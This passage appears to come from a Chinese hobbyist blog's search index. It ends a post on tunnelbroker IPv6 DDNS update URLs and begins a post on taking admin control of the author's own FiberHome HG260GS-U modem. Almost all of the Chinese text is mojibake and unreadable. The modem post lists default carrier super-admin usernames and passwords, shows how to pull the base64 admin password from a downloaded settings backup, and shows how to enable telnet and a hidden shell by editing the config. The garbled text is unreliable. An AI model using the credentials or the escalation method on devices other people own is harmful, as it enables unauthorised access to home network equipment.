https://ipv4.tunnelbroker.net/nic/update?username=&lt;USERNAME&gt;&amp;password=&lt;PASSWORD&gt;&amp;hostname=&lt;TUNNEL_ID&gt; æ‰‹åŠ¨æŒ‡å®šæ›´æ–°çš„IPv4åœ°å€ï¼š To manually specific your IPv4 address: https://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@ipv4.tunnelbroker.net/nic/update?hostname=&lt;TUNNEL_ID&gt;&amp;myip=&lt;IP ADDRESS&gt; https://ipv4.tunnelbroker.net/nic/update?username=&lt;USERNAME&gt;&amp;password=&lt;PASSWORD&gt;&amp;hostname=&lt;TUNNEL_ID&gt;&amp;myip=&lt;IP ADDRESS&gt; å½“ç„¶ä¸æƒ³çœ‹çš„è¯å°±çœ‹å®Œæ•´ç‰ˆï¼š **TL;DR:**ï¼ˆToo long; Don't read/ Too long; Didn't readï¼‰ http[s]://[TB_USER:TB_PASS@]tunnelbroker.net/nic/update?[username=TB_USER&amp;password=TB_PASS&amp;]hostname=&lt;TUNNEL_ID|tunnelTUNNEL_ID.tunnelbroker.net|TB_USER-TUNNEL_LABEL.tserv#.LOC#.ipv6.he.net&gt;[&amp;myip=IPV4] åé¢å¯ä»¥è¯•ä¸€è¯•è¿™ä¸ªåŠŸèƒ½ hhhh å½“ç„¶äº†ï¼ŒHEè¿˜è‡ªå¸¦äº† DNS è§£æï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹å‘¢ã€‚ ä¸‹é¢è¿˜æœ‰ä¸€äº›å…³äº IPv6 çš„æ‹“å±•çš„é“¾æ¥ã€‚ å¥½äº†å°±è¿™æ ·å§ã€‚ ï¼ˆæºœäº†æºœäº† Reference &amp; Extensive Readingè®°ä¸€æ¬¡ç»™çº¿ä¸ŠæœåŠ¡å™¨æ·»åŠ IPv6æ”¯æŒçš„æ­¥éª¤ He.net DNSåŸŸåè§£æç”³è¯·ä½¿ç”¨-å…è´¹DDNSã€IPv6 åœ°å€å’ŒSlave DNS ç”³è¯· HE.NET IPv6 éš§é“ä»¥ä½¿ä¸»æœºæ”¯æŒ IPv6 Servarica IPv6 Only VPSæŠ˜è…¾ä½“éªŒ å¦‚ä½•ç»™é˜¿é‡Œäº‘ecså¼€å¯ipv6è®¿é—® é˜¿é‡Œäº‘centos6.8å¼€å¯ipv6é€šè¿‡appstoreå®¡æ ¸çš„æ–¹æ³• é˜¿é‡Œäº‘æœåŠ¡å™¨ä»¥åŠCDNæ”¯æŒIPV6çš„æ–¹æ³• Dyn-compliant Endpoint Updates etc.","path":"2020/03/03/Server_ObtainIPv6ViaTunnelBroker/"},{"title":"å…‰çŒ«æŠ˜è…¾è®° | è·å–è¶…çº§ç®¡ç†å‘˜å¯†ç &å¼€å¯telnet&IPv6&æ¡¥æ¥å®½å¸¦","text":"0x00 å‰è¨€æœ€è¿‘è§‰å¾—å®¶é‡Œçš„ç½‘é€Ÿæœ‰ç‚¹æ…¢ï¼Œä¸Šç€ç½‘è¯¾æˆ–è€…çœ‹ç€è§†é¢‘ï¼ŒWiFi è¿æ¥çš„è®¾å¤‡åŒæ—¶åœ¨ç”¨çš„è¯å°±å¼€å§‹å¡äº† emmmå°±å¾ˆéš¾å—ã€‚ğŸ™ ç„¶ååˆå¬è¯´ä¸‰å¤§è¿è¥å•†çš„å®½å¸¦å·®ä¸å¤šéƒ½åˆ†é… IPv6 äº†ï¼Œæ‰‹æœºçš„è¯è”é€šæµé‡åˆ†é… IPv6 åœ°å€ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œå¼€çƒ­ç‚¹è¿˜èƒ½ä¸‹å‘ IPv6 åˆ°å…¶ä»–è®¾å¤‡ï¼ˆç„¶é¹…æˆ‘è¿™é‡Œçš„ç§»åŠ¨å¥½åƒè¿˜æ²¡æœ‰ï¼‰ã€‚ äºæ˜¯å°±æƒ³æŠ˜è…¾ä¸€ä¸‹å®¶é‡Œçš„å…‰çŒ«/è·¯ç”±å™¨ï¼Œåæ­£å°±æ˜¯çæŠ˜è…¾å§ã€‚ è¿™ä¸ªå…‰çŒ«æ˜¯æœ‰ç‚¹å¹´çºªçš„ HG260GS-Uï¼Œçƒ½ç«å®¶çš„ã€‚ ç¡¬ä»¶ç‰ˆæœ¬ BCM.V2.0 ï¼Œè½¯ä»¶ç‰ˆæœ¬ G00Y1.00M0001 ã€‚ å¤§æ¦‚çš„å†…å®¹å°±æ˜¯â€”â€” è·å–äº†è¶…çº§ç®¡ç†å‘˜å¯†ç ï¼Œå¼€å¯äº† Telnet ç®¡ç†ï¼Œå¯ç”¨äº† IPv6ï¼Œå¹¶å°è¯•äº†å®½å¸¦æ¡¥æ¥çš„æ”¹é€ ç­‰ç­‰ã€‚ 0x01 è·å–è¶…çº§ç®¡ç†å‘˜å¯†ç é€šè¿‡å…‰çŒ«çš„ç®¡ç†åœ°å€è¿æ¥åˆ°ç®¡ç†é¡µé¢ï¼Œä¸€èˆ¬æ˜¯ 192.168.1.1ã€‚ç™»å½•ç•Œé¢å¦‚ä¸‹ã€‚ å…‰çŒ«èƒŒé¢æœ‰ä¸€ä¸ª user ç”¨æˆ·çš„ä¿¡æ¯ï¼Œç™»å½•ä¹‹åçš„ç•Œé¢åŠŸèƒ½è´¼å°‘ï¼Œåªèƒ½çœ‹ä¸€ä¸‹è¿æ¥çŠ¶æ€ï¼Œè®¾ç½®ä¸€ä¸‹WIFIã€é™æ€è·¯ç”±ä¹‹ç±»çš„åŸºç¡€é…ç½®ï¼Œè¿å®½å¸¦è¿æ¥éƒ½è®¾ç½®ä¸äº†ã€‚ äºæ˜¯æƒ³åˆ°é€šè¿‡è¶…çº§ç®¡ç†å‘˜è¿›è¡Œç™»å½•ã€‚ åœ¨ç½‘ä¸Šæœäº†å„ç§é€šç”¨å¯†ç ï¼Œæ¯”å¦‚ç”¨æˆ·åã€å¯†ç åˆ†åˆ«ä¸º CUAdmin CUAdmin telecomadmin nE7jA%5m CMCCadmin aDm8H%MdA fiberhomehg2x0 hg2x0 ï¼ˆå·¥ç¨‹è´¦å·ï¼‰ æœ‰å¯èƒ½ç™»å½•æ˜¯è¿™ä¸ªç½‘å€ï¼šhttp://192.168.1.1/cu.html ç„¶è€Œéƒ½æ²¡æœ‰ç”¨ï¼ å“¦å¯¹äº†ï¼Œè¿™ä¸ªå·¥ç¨‹è´¦å·ï¼ˆæ®è¯´æ˜¯éšè—ç”¨æˆ·ï¼‰è¿™æ ·å¼€å¯ï¼š è®¿é—® http://192.168.1.1/logoffaccount.html ï¼Œå°†éšè—ç”¨æˆ·è®¾ç½®ä¸ºå¯ç”¨ï¼Œè€Œåç‚¹å‡»ä¿å­˜/åº”ç”¨å³å¯ã€‚ ï¼ˆç„¶è€Œæˆ‘è¿™é‡Œæ²¡ç”¨ äºæ˜¯çœ‹äº†çœ‹ç½‘ä¸Šå¤§ä½¬ä»¬çš„éªšæ“ä½œï¼Œå‘ç°å¯ä»¥é€šè¿‡å¤‡ä»½è®¾ç½®çš„åŠæ³•è·å–åˆ°è¶…çº§ç®¡ç†å‘˜è´¦å·åŠå¯†ç ã€‚ Step 1 ä»¥æ™®é€šç”¨æˆ·èº«ä»½ç™»å½•å…‰çŒ«å°±æ˜¯å…‰çŒ«èƒŒåçš„é‚£ä¸ªç”¨æˆ·åå¯†ç å•¦ã€‚ Step 2 ä¸‹è½½è®¾ç½®å¤‡ä»½æ–‡ä»¶è®¿é—® http://192.168.1.1/backupsettings.conf ï¼Œä¸‹è½½é…ç½®æ–‡ä»¶backupsettings.confã€‚ æ³¨æ„ä¸€å®šè¦åœ¨ç™»é™†åæ‰ä¸‹è½½ï¼Œå¦åˆ™ä¸‹è½½å¾—åˆ°çš„æ–‡ä»¶å¹¶æ²¡æœ‰é…ç½®ä¿¡æ¯ï¼Œè€Œæ˜¯ä¸€ä¸ªè®©ä½ ç™»å½•ç•Œé¢çš„ HTML æ–‡ä»¶ã€‚ æ­£ç¡®çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªxmlæ–‡æœ¬ï¼Œä¾‹å¦‚ä¸‹é¢è¿™æ ·çš„ã€‚ å¯ä»¥å‘ç°é‡Œé¢ä¿å­˜äº†æ‰€æœ‰çš„é…ç½®ä¿¡æ¯ï¼ŒWANè¿æ¥ã€LANè¿æ¥ã€WiFiåŠWPSã€å®½å¸¦ä¿¡æ¯ã€Loidç­‰ç­‰éƒ½æœ‰ï¼Œå½“ç„¶ï¼Œè¶…çº§ç”¨æˆ·ä¿¡æ¯ä¹Ÿåœ¨ã€‚ è€Œä¸”è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰ï¼ˆæ˜æ˜¾çš„ï¼‰åŠ å¯†ï¼Œæœ€å¤šåªæ˜¯ç”¨äº†ä¸ªbase64ã€‚ è¶…çº§ç®¡ç†å‘˜ç”¨æˆ·å°±åœ¨DeviceInfoä¸‹çš„X_CMCC_TeleComAccounté‡Œã€‚ ç”¨æˆ·åä¸ºadminï¼Œå¯†ç é€šè¿‡base64è§£ç å¯ä»¥å¾—åˆ°ä¸ºCmcc10086#ã€‚ ï¼ˆBy the wayï¼Œuserç”¨æˆ·çš„å¯†ç åœ¨è¿™é‡Œå•¦â†“ Step3 ç™»å½•è¯•è¯•æˆåŠŸç™»å½•ï¼Œç•Œé¢æ¯”useråŠŸèƒ½å¤šå¾—å¤šäº†ï¼Œå¯ä»¥é…ç½®å®½å¸¦ä¿¡æ¯ã€VLANã€USBå­˜å‚¨è¿œç¨‹ä¸‹è½½ç­‰ç­‰äº†ã€‚ 0x02 å¼€å¯ Telnet ç®¡ç†æŒ‰ç†è¯´æ˜¯å¯ä»¥åˆ©ç”¨å·¥ç¨‹è´¦å·è¿›å»å¼€å¯ Telnet çš„ï¼Œç„¶è€Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥è¿›ä¸å»emmm æ‰¾ä¸ªç½‘ä¸Šçš„å›¾â†“ é‚£å°±**ç›´æ¥æ”¹é…ç½®æ–‡ä»¶å¥½å§ **233333 Step 1 ä¿®æ”¹é…ç½®æ–‡ä»¶é¦–å…ˆå¤‡ä»½ä¸€ä»½ä¸Šé¢ä¸‹è½½çš„é…ç½®æ–‡ä»¶ï¼ˆæ”¹é”™äº†è¿˜å¯ä»¥æ¢å¤å˜›ï¼‰ï¼Œè€Œåæœç´¢telnetï¼ŒæŠŠå®ƒè®¾ä¸ºTRUEã€‚ æ³¨æ„å¤§å°å†™å‘€ï¼ å½“ç„¶å¦‚æœæƒ³è¦å¼€å¯ FTP çš„è¯å¯ä»¥é¡ºä¾¿å¼€å¯ä¸€ä¸‹hhhã€‚ Step 2 ä¸Šä¼ é…ç½®æ–‡ä»¶è®¿é—®æ›´æ–°è·¯ç”±å™¨é…ç½®çš„é¡µé¢ http://192.168.1.1/updatesettings.html ï¼ˆå¯èƒ½éœ€è¦ç™»å½•ï¼‰ é€‰æ‹©ä¿®æ”¹åçš„é…ç½®æ–‡ä»¶ï¼Œç‚¹å‡» æ›´æ–°é…ç½®ã€‚ Step 3 é‡å¯å…‰çŒ«ï¼ˆå¦‚æœæ²¡æœ‰è‡ªåŠ¨é‡å¯çš„è¯ å¯ä»¥é€‰æ‹©åœ¨ ç®¡ç†-è®¾å¤‡ç®¡ç†-è®¾å¤‡é‡å¯ é‡Œé‡å¯ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥å…³æ‰ç”µæºå†æ‰“å¼€233ã€‚æ€ä¹ˆå–œæ¬¢æ€ä¹ˆæ¥ã€‚ Step4 telnet è¿æ¥å…‰çŒ«è€Œåå°±å¯ä»¥é€šè¿‡ telnet è¿æ¥åˆ°ä½ çš„å…‰çŒ«äº†ã€‚ ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯adminã€‚ å®ƒç”¨çš„æ˜¯ BCM96838 è¿™ä¸ªèŠ¯ç‰‡ã€‚ï¼ˆæ„Ÿå…´è¶£å¯ä»¥æœä¸€æœ å‘ç°å®ƒå¹¶æ²¡æœ‰ cd è¿™ä¸ªcommandã€‚ &gt; help ? help logout exit quit reboot brctl cat virtualserver ddns df loglevel logdest dumpcfg dumpmdm dumpeid mdm meminfo psp kill dumpsysinfo dnsproxy syslog echo ifconfig ping ps pwd sntp sysinfo tftp wlctl showOmciStats laser omci omcipm dumpOmciVoice dumpOmciEnet dumpOmciGem laser arp defaultgateway dhcpserver dns lan lanhosts passwd ppp restoredefault route save swversion uptime cfgupdate swupdate exitOnIdle wan set get gendefsettings loaddefsettings checkdefsettings composenewsettings create_merge_presetting transform_presetting upgrade ledctl usbtest ls facmode simcard voipteststart voiptestend voice_test phone_connect recordpcmstart recordpcmend StartCall StopCall StartRing StopRing PlayCNGTone StopCNGTone PlayDTMFTone fhvoice redirect mcpctl itms wifi card ä¸è¿‡å¥½åƒåŠŸèƒ½ä¹Ÿä¸å°‘çš„äºšå­ã€‚ çœ‹äº†ä¸€ä¸‹å­˜å‚¨ã€‚ å†…å­˜ã€‚ ç„¶åå‘ç°æœ‰ä¸€ä¸ªéšè—çš„shæŒ‡ä»¤ï¼Œå¯ä»¥æ”¯æŒå¤§éƒ¨åˆ†çš„ Linux æŒ‡ä»¤å•¦~ çœ‹äº†ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯ã€‚ # uname -a Linux (none) 3.4.11-rt19 #3 SMP PREEMPT Mon Jul 4 19:17:02 CST 2016 mips GNU/Linux webs ç›®å½•ä¸‹ä¸ºæ‰€æœ‰çš„å‰ç«¯ç½‘é¡µçš„æ–‡ä»¶ã€‚ FHFactoryCheck.html ipsec.html FH_Simple_CloseHideWeb.html ipsecview.html FH_Simple_FactoryRestore.html ipv6lancfg.html FH_Simple_OpenHideWeb.html itms_right.html StaticIpAdd.html itms_wrong.html StaticIpErr.html itmsuploadfinish.html areacode.js itmsuploadfinish_guangdong.html backupsettings.html itmsuploadingimage.html buildinfo.html itmsuploadingimage_guangdong.html certadd.html itmsuploadreboot.html certcaimport.html jquery.js certcaview.html lanvlancfg.html certimport.html lockerror.html certloadsigned.html logconfig.html certlocalview.html login.html certreqshow.html loginerror.html certshow.html logintro.html cfgepon.html logo.html cfgeth.html logoffaccount.html cfggpon.html logout.html codepassword.html logview.html colors.css macstudy.html ctExternalApInfo_user.html main.html ctExternalApInfooffline.html mainCT.html ctStaticIpAdd.html menuCT.js ctTracerouteresult.html menuTitle.js ctalgcfg.html menuTree.js ctdhcpcfg.html multicast.html ctdhcpdevice.html password.html ctdiag.html pic ctdiag_ping.html platconfig.html ctdiag_tracert.html portName.js ctdiagmng.html portalmngr.html ctdiagsystem.html portmap.html ctdiagxPon.html portmapadd.html ctdms.html portmapedit.html ctdnsconfig.html pradd.html cteponinterfaceinfo.html prmngr.html ctexternalApInfo.html pswdadmin.html ctgponinterfaceinfo.html pswduser.html ctigmpproxy.html qoscls.html ctigmpsnooping.html qosclsedit.html ctinfo.html qosclsview.html ctinfo_fujian.html qosqmgmt.html ctipflt.html qosqueue.html ctipfltblack.html qosqueueadd.html ctipfltwhite.html qosview.html ctlanbind.html rebootinfo.html ctlogconfig.html redirect.html ctlogflashview.html redirect_cardoffline.html ctlogintro.html redirect_portal.html ctlogview.html redirect_portal_confirm.html ctloid.html redirect_uploadimage.html ctmacflt.html register.html ctmacpolicy.html register_anhui.html ctmldproxy.html register_fail.html ctmldsnooping.html register_fujian.html ctmulticastvlan.html register_guangdong.html ctpingresult.html register_guangdong_fail.html ctpswdrelogin.html register_hainan.html ctroute6add.html register_ing.html ctstatslan.html register_ing_anhui.html ctstatslan_user.html register_ing_card.html ctusererror.html register_ing_fujian.html ctuserpswd.html register_ing_guangdong.html ctwan_ethinfo.html register_ing_guangdong_1.html ctwanconfig.html register_ing_guangdong_refresh.html ctwanconfig_user.html register_ing_hainan.html ctwaninfo.html register_ing_iframe.html ctwaninfo6.html register_ing_iframe_refresh.html ctwaninfo6_user.html register_ing_iframe_refresh_1.html ctwaninfo_user.html register_ing_sichuan.html ctwaninfoall.html register_limit.html ctwaninfoallv6.html register_loid.html ctwlanInfo.html register_restore.html ctwlanInfo_user.html register_restore_remote.html ctwlcfg.html register_restore_retry.html ctwlsecurity.html register_restore_retry_sichuan.html ddnsadd.html register_restore_sichuan.html defaultsettings.html register_restoreinfo.html dhcpinfo.html register_sichuan.html diaginform.html registered_chongqing.html dnscfg.html registered_fujian.html dnsproxycfg.html registered_guangdong.html dosprotect.html registered_hunan.html downloadFile.html resetrouter.html enableipv6.html restoreinfo.html engdebug.html restoresettings.html eponadderr.html restrain.html epondelerr.html ripcfg.html ethadderr.html routeadd.html ethdelerr.html routetbl.html exporting.js rtdefaultcfg.html externalapcfg.html rtdefaultcfgerr.html externalapcfgoffline.html rtroutecfg.html externalapsecurity.html scdmz.html externalapsecurityoffline.html scinflt.html factorymode.html scinfltview.html fbctwanconfig.html scmacflt.html fhvoiceh248dsp.html scmacfltview.html fhvoiceh248mgc.html scmacpolicy.html fhvoiceh248ngn.html scoutflt.html fhvoiceh248port.html scoutfltview.html fhvoiceprotocol.html scvrtsrv.html fhvoicesettings.html servmngr.html fhvoicesipadvance.html simcardoffline.html fhvoicesipbasic.html sipregstatus.html fhvoicesipdigitmap.html sipteleview.html fhvoicesipfax.html sntpcfg.html fhvoicesipuserline.html speed.html firewall.html statsifc.html footer.html statsifcreset.html ftpcfg.html statswan.html gponadderr.html statswanreset.html gpondelerr.html storageusraccadd.html help_manage_device.html stylemain.css help_manage_file.html stylesCT.css help_manage_keep.html surprise.html help_manage_user.html todadd.html help_net_QOS.html todmngrview.html help_net_WLAN.html tr69cfg.html help_net_dhcp.html tr69cfgview.html help_net_externalap.html tr69connect.html help_net_network.html traffictl.html help_net_remote.html traffictladd.html help_net_route.html updatesettings.html help_net_time.html upload.html help_net_voice.html upload_chongqing.html help_net_voip.html uploadinfo.html help_safe_firewall.html upnpcfg.html help_safe_mac.html url_add.html help_safe_port.html urlfilter.html help_safe_wan.html urlfilterErr.html help_status_device.html usbbackup.html help_status_net.html usbbackuphandle.html help_status_remote.html usbbackupresult.html help_status_user.html usbinfo.html help_status_voip.html usbxdown.html help_use_IGMP.html util.js help_use_MLD.html wlcfg.html help_use_UPNP.html wlcfg_jiangsu.html help_use_VOIP.html wlcfg_zhejiang.html help_use_device.html wlcfg_zhejiang_user.html help_use_dns.html wlcfgadv.html help_use_nat.html wlrefresh.html help_use_usual.html wlsecurity.html highcharts.js wlsecurity_jiangsu.html hlpethconn.html wlsecurity_zhejiang.html hlpwlconn.html wlsecurity_zhejiang_user.html index.html wlshared.html ipsconfig.html wlwapias.html ç„¶åè¿˜å¯ä»¥å‘ç°ä¹‹å‰çš„é…ç½®æ–‡ä»¶åœ¨ /fhconf/backpresettings.confã€‚ æ—¥å¿—æ–‡ä»¶åœ¨/fhlog/messages ã€‚ /rom/etc/wlan ç›®å½•ä¸‹å¥½åƒæœ‰ä¸€äº›ç½‘å¡èŠ¯ç‰‡çš„é©±åŠ¨ï¼ˆï¼Ÿ ç„¶ååœ¨æŸä¸ªç›®å½•ä¸‹æ‰¾åˆ°äº†å„ç§é»˜è®¤é…ç½®æ–‡ä»¶emmm å…¶ä»–çš„åé¢å†æ…¢æ…¢ç©å§ï¼ˆ è¿˜æœ‰æé†’ä¸€ä¸‹ï¼Œtelnet ä¸ç”¨çš„è¯æœ€å¥½è¿˜æ˜¯å…³æ‰å§ï¼Œé˜²æ­¢åˆ«äººè¿ä¸Šå…‰çŒ«æ”¹äº†ä½ çš„é…ç½®å°±ä¸å¥½äº†å‘¢ã€‚ 0x03 å†çœ‹å…‰çŒ«å‚æ•° &amp; æµ‹é€Ÿå…‰çŒ«å‚æ•°ä¸Šç½‘æœäº†ä¸€ä¸‹è¿™ä¸ªå…‰çŒ«çš„å‚æ•°ã€‚ï¼ˆå¯èƒ½æœ‰æ‰€åŒºåˆ«ï¼‰ çƒ½ç«HG260GS-U äº§å“ç‰¹ç‚¹ æ”¯æŒGPONæ¥å£ï¼Œ4FE+2POTSï¼ŒLAN1å£=1G LAN 2.3.4å£=100M æ”¯æŒè·¯ç”±/æ¡¥æ··åˆè½¬å‘ã€‚ æ”¯æŒVLANè¿æ¥ã€‚ æä¾›2.4GHz 802.11b/g/næ— çº¿æ¥å…¥åŠŸèƒ½ï¼Œæœ€é«˜é€Ÿç‡å¯è¾¾270Mbpsï¼Œè¦†ç›–èŒƒå›´30m~100mã€‚ æ”¯æŒSIP/MGCP/H.248ç­‰VOIPåè®®è¯­éŸ³ï¼Œæ”¯æŒå¤šç§è¯­éŸ³ç¼–ç å™¨ã€‚ å¼ºå¤§çš„QoSèƒ½åŠ›ï¼Œä¿éšœå¤šä¸šåŠ¡ç¯å¢ƒä¸‹çš„VoIPã€IPTVç­‰å…³é”®ä¸šåŠ¡çš„æœåŠ¡è´¨é‡ã€‚ æ”¯æŒTR-069è¿œç¨‹ç®¡ç†ï¼šè®¾å¤‡é…ç½®ã€ç‰ˆæœ¬å‡çº§ã€è¯Šæ–­ç­‰ã€‚ æ”¯æŒWPSã€‚ æ”¯æŒWebæ–¹å¼ï¼Œç”¨æˆ·æœ¬åœ°ç®¡ç†åŠŸèƒ½ã€‚ æ”¯æŒå¤šSSIDï¼Œæä¾›å¤šä¸ªè™šæ‹Ÿæ— çº¿ç½‘ç»œã€‚ æ”¯æŒVPNç©¿è¶Š ï¼ŒåŸºäºIPSec/L2TPã€‚ æ”¯æŒIPv4/v6,TCP/UDPåè®®ï¼Œæ”¯æŒIPv6å¼€å¯DS-liteå’ŒåŒæ ˆåŠŸèƒ½ã€‚ èŠ¯ç‰‡é›†æˆåº¦é«˜ï¼ŒåŠŸè€—å°ï¼Œæ€§èƒ½ç¨³å®šã€‚ å“‡å‘œï¼Œå®ƒæ˜¯æ”¯æŒåƒå…†çš„å•Šï¼ ä¸è¿‡åªæœ‰1å£æ”¯æŒ1Gbpsï¼Œå…¶ä»–éƒ½æ˜¯100Mbpsçš„emmm äºæ˜¯ç›´æ¥ç”¨ç½‘çº¿è¿æ¥å…‰çŒ«æµ‹äº†ä¸€ä¸‹ï¼Œæœç„¶æ˜¯è¿™æ ·ã€‚ ä¹‹å‰éƒ½æ²¡æ³¨æ„è¿™ä¸ªé—®é¢˜å”‰ï¼æ˜¯ä¸æ˜¯å› ä¸ºè¿™ä¸ªé—®é¢˜å½±å“äº†ç½‘é€Ÿå•Šå•Šå•Šå•Šå˜¤å˜¤å˜¤ã€‚ï¼ˆå…¶å®æˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘å®¶å®½å¸¦æœ‰å¤šå°‘å¸¦å®½ï¼‰ æ¥æµ‹ä¸ªé€Ÿçœ‹çœ‹å¥½äº†ã€‚ æµ‹é€Ÿè¿™æ˜¯ è¿æ¥ WiFi çš„æµ‹é€Ÿç»“æœâ†“ã€‚ é€šè¿‡ç½‘çº¿ç›´è¿åˆ°é™¤1å£å¤–çš„ä»»æ„ä¸€ä¸ª LAN å£ï¼Œå†æ¬¡æµ‹é€Ÿã€‚ å·®ä¸å¤šè·‘æ»¡100Mbpsçš„å¸¦å®½äº†ã€‚ é‚£å†æ¥çœ‹çœ‹ LAN1 çš„åƒå…†å£å§ã€‚ ï¼Ÿï¼Ÿï¼Ÿ ä½ åœ¨é€—æˆ‘å˜›ï¼Ÿï¼å“‡å‘œåŸæ¥æœ‰å·®ä¸å¤š150Mbpsçš„å•Šï¼ åŸæ¥å—é™äº LAN å£çš„å¸¦å®½å•Šï¼ æ°”æ­»æˆ‘äº†ï¼Œè¿æ¥WiFiçš„è¯åªæœ‰å·®ä¸å¤š1/3çš„é€Ÿåº¦å•Šï¼Œè‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ã€‚ ç„¶åæŠŠä¹‹å‰è¿åœ¨å…‰çŒ«åçš„æ— çº¿è·¯ç”±å™¨æ¥åˆ°äº† LAN1 å£ï¼Œå†ç™»ä¸Šè·¯ç”±å™¨ä¸€çœ‹ï¼ŒåŸæ¥å®ƒä¹Ÿåªæ”¯æŒç™¾å…†å¸¦å®½emmm ä¸è¿‡æ€ä¹ˆè¯´å¥½å‘¢ï¼Œæ¯•ç«Ÿè¿™å…‰çŒ«å’Œè·¯ç”±å™¨éƒ½æœ‰äº›å¹´çºªäº†ï¼Œé‚£æ—¶å€™åƒå…†è¿˜æ²¡æ™®åŠå‘¢ï¼Œå¯èƒ½ç”¨çš„æ‰æ˜¯10M/50Mæœ€å¤šä¹Ÿä¸è¶…è¿‡100Mçš„å®½å¸¦å‘¢ã€‚ æ‰€ä»¥å…‰çŒ«æœ‰ä¸€ä¸ªåƒå…†å£ä¹Ÿå¾ˆä¸é”™äº†å‘¢233333.ï¼ˆæ‘Šæ‰‹.gif ç½‘çº¿çš„è®²ç©¶å™¢å¯¹äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªå¥½ç©çš„äº‹ã€‚ã€‚ã€‚ è¦ç”¨ä¸Šåƒå…†ä»¥å¤ªç½‘ï¼Œä¸ä»…éœ€è¦å…‰çŒ«ã€è·¯ç”±å™¨æ”¯æŒï¼Œè¿˜è¦ä½ è‡ªå·±çš„è®¾å¤‡æ”¯æŒï¼Œå¦‚æœæœ‰çº¿è¿æ¥çš„è¯ç½‘çº¿è¿˜è‡³å°‘è¦è¶…äº”ç±»çº¿ã€‚ ä½†æ˜¯è¿˜è¦æ³¨æ„è·ç¦»é™åˆ¶ï¼Œè¶…è¿‡ä¸€å®šçš„è·ç¦»ï¼ˆå¦‚100mï¼‰ä¹Ÿä¸è¡Œäº†ï¼Œç±»åˆ«è¶Šé«˜ä¼ è¾“çš„é¢‘ç‡è¶Šé«˜åˆ™å…è®¸çš„è·ç¦»å°±è¶Šå°ã€‚ï¼ˆå•Šå¤§ä½¬ä½ ç”¨å…‰çº¤ï¼Ÿæ‰“æ‰°äº†ã€‚ æˆ‘ç”¨ç½‘çº¿è¿æ¥çš„æ—¶å€™ï¼Œæœ€å¼€å§‹ç”¨çš„æ˜¯ä¸€æ ¹æ¯”è¾ƒè€çš„ CAT-5eï¼ˆè¶…äº”ç±»ï¼‰çº¿ï¼Œå¯èƒ½æ˜¯ç«¯å£æ¥è§¦ä¸å¤§å¥½æˆ–è€…çº¿è·¯è€åŒ–çš„åŸå› å§ï¼Œå®é™…ç½‘å¡åªåå•†åˆ°äº†100Mbpsã€‚æ¢äº†ä¸€æ ¹æ–°çš„ç½‘çº¿ï¼ˆå¥½åƒä¹Ÿæ˜¯CAT-5eï¼‰å°±æœ‰1Gbpsäº†ã€‚ ç„¶è€Œï¼Œè¿™æ ¹ç½‘çº¿ä¸å¤Ÿé•¿ï¼Œæˆ‘ç”¨è¿æ¥å™¨æŠŠä¸¤æ ¹éƒ½èƒ½é€šåƒå…†çš„ç½‘çº¿è¿ä¸€èµ·å†è¿åˆ°ç”µè„‘ï¼Œè¿™æ—¶ç½‘å£åˆåå•†åˆ°100Mbpsäº†emmm çœ‹æ¥è¿™ä¸ªç½‘çº¿æŠ—å¹²æ‰°èƒ½åŠ›ä¸å¤§è¡Œå‘€ï¼Œåƒå…†ç½‘çš„æœ‰çº¿ä¼ è¾“è¦æ±‚è¿˜æ˜¯æŒºä¸¥æ ¼çš„ã€‚ ä¸è¿‡ç°åœ¨ç”¨çš„åŸºæœ¬å°±å…­ç±»çº¿ä»¥ä¸Šäº†å§ï¼Œä¹°ç½‘çº¿è¿˜æœ‰è£…ä¿®å¸ƒçº¿ä»€ä¹ˆçš„æ—¶å€™è¦æ³¨æ„ä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚ è¿˜æœ‰ä¹°ç½‘çº¿ä¸è¦ä¹°æ‰çš„é‚£ç§ï¼Œå‰–é¢åœ†å½¢é‚£ç§å°±å¥½ã€‚ï¼ˆæ„Ÿè§‰ç®—æ˜¯ä¼ è¾“çº¿ç†è®ºï¼Ÿ 0x04 å¯ç”¨ IPv6å‰é¢çœ‹å…‰çŒ«çš„å‚æ•°ï¼Œå‘ç°æ”¯æŒ IPv6 å”‰ï¼ å¬è¯´ä¸‰å¤§è¿è¥å•†çš„å®½å¸¦åŸºæœ¬éƒ¨ç½² IPv6 äº†ï¼Œä¸è¿‡ä¼°è®¡è®¾ç½®é‡Œæ²¡å¼€å¯ï¼Œæœ¬åœ°ä¹Ÿæ²¡æœ‰åˆ†é…å…¬ç½‘åœ°å€ï¼Œè¿™æ¬¡å°±æ¥æŠ˜è…¾ä¸€ä¸‹å§ã€‚ å…ˆè¯´ä¸€ä¸‹ï¼Œæˆ‘è‡ªå·±å¯¹IPv6è¿™ä¸€å—éƒ½ä¸å¤§äº†è§£ï¼Œè¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å°è¯•è®¾ç½®è¿™ä¸ªã€‚ åŒ…æ‹¬å‰ç¼€åˆ†é…ä»€ä¹ˆçš„æˆ‘éƒ½ä¸æ¸…æ¥šï¼Œæ‰€ä»¥è¿™é‡Œçš„è¯´æ³•æœ‰å¯èƒ½å­˜åœ¨é”™è¯¯ï¼Œå¤§ä½¬ä»¬çœ‹åˆ°çš„è¯æ¬¢è¿å’Œæˆ‘äº¤æµå‘€ï¼ Step 1 ä»¥è¶…çº§ç®¡ç†å‘˜èº«ä»½ç™»å½•å…‰çŒ«ç”¨ä¸Šé¢è·å–çš„ç”¨æˆ·åå¯†ç ç™»å½•ã€‚ åœ¨è®¾ç½®å‰ï¼ŒæŸ¥çœ‹çŠ¶æ€-ç½‘ç»œä¾§ä¿¡æ¯-IPv6 è¿æ¥ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯ç©ºçš„ã€‚è€Œ IPv4 